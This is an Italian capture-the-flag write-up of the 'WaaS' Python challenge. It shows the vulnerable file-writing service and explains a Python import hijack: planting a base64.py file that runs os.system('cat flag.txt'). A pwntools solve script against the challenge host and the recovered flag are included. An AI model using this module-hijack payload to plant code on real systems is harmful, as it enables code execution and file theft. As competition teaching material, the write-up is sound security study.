+++
title = 'WaaS'
date = 2024-08-06T11:27:07+02:00
tags = [
  "Misc",
  "Python",
  "491 points",
  "78 solves",
  "NoobMaster + NoobHacker"
]
draft = true
+++

<h1 style='text-decoration: underline;text-decoration-color: #9e8c6c;font-size: 3em;'>Waas</h1>

**Descrizione**: Writing as a Service!

## Introduction

WaaS (Writing as a Service) ci permette di sovrascrivere un file sul sistema (dopo un certo controllo dell'input) e di inserirvi tutto ciò che vogliamo (fino a quando non si incontra un newline).

```python
import subprocess
from base64 import b64decode as d
while True:
        print("[1] Write to a file\n[2] Get the flag\n[3] Exit")
        try:
                inp = int(input("Choice: ").strip())
        except:
                print("Invalid input!")
                exit(0)
        if inp == 1:
                file = input("Enter file name: ").strip()
                assert file.count('.') <= 2 # Why do you need more?
                assert "/proc" not in file # Why do you need to write there?
                assert "/bin" not in file # Why do you need to write there? 
                assert "\n" not in file # Why do you need these?
                assert "chall" not in file # Don't be overwriting my files!
                try: 
                        f = open(file,'w')
                except:
                        print("Error! Maybe the file does not exist?")

                f.write(input("Data: ").strip())
                f.close()
                print("Data written sucessfully!")

        if inp == 2:
                flag = subprocess.run(["cat","fake_flag.txt"],capture_output=True) # You actually thought I would give the flag?
                print(flag.stdout.strip())
```

## Solution

In un primo momento si potrebbe pensare di provare a bypassare la validazione dell'input, magari riscrivendo il funzionamento del comando cat o del file di sfida stesso, ma questo non è possibile.
Una cosa molto bizzarra è l'importato ma inutilizzato `b64decode` dal modulo `base64`, che è ciò che ci permette di risolvere la sfida.

Quando python importa i moduli, guarda in `sys.path`, che ha un elenco di directory valide da cui importare i moduli. Dopo una rapida ricerca nei [python3 docs](https://docs.python.org/3/library/sys_path_init.html), scopriamo che la prima directory in cui cerca è la stessa directory in cui si trova il file, il che significa che se abbiamo un file `base64.py` nella directory, allora python cercherà di importare un simbolo `b64decode` da quel file, invece del comune modulo conosciuto.
Un'altra caratteristica del comportamento di importazione di python che possiamo usare è che tutto il codice di un modulo importato sarà eseguito. Per esempio, se un file `test.py` ha `print('Hello, World!')` e può essere eseguito (per esempio se è al livello di indentazione più basso), un file con `import test` vedrà effettivamente `Hello, World!` stampato su `stdout`.
Pertanto, poiché la funzione `open` con una flag `'w' creerà un file se non esiste, possiamo semplicemente creare un file chiamato base64.py` e scriverci dentro il nostro codice malevolo.

Qualcosa del genere farà al caso vostro:

```python
import os; b64decode = 0; os.system("cat flag.txt")
```

Ma la flag non è ancora nostro; dobbiamo sfruttare il fatto che l'istanza non resetta i suoi file ogni volta che ci si connette, il che significa che il nostro `base64.py` rimarrà nella cartella per tutta la durata dell'istanza. Questo significa che dobbiamo semplicemente riconnetterci e ottenere la flag.

`solve.py`

```python
from pwn import *

def solve():
  r = remote('challs.n00bzunit3d.xyz', 10478) # PORT depends on the instance

  r.sendlineafter(b'Choice: ', b'1') # 1 to write a file
  r.sendlineafter(b'Enter file name: ', b'base64.py')
  r.sendlineafter(b'Data: ', b'import os; b64decode = 0; os.system("cat flag.txt")')

  r.close()

  r = remote('challs.n00bzunit3d.xyz', 10478) # PORT depends on the instance
  flag = r.recvline().decode()
  print(f'flag: {flag}')
  r.close()

if __name__ == '__main__':
  solve()
```

```text
$ flag: n00bz{0v3rwr1t1ng_py7h0n3_m0dul3s?!!!_f5c63f47af0e}
```

<p align="right">Author: vympel</p>
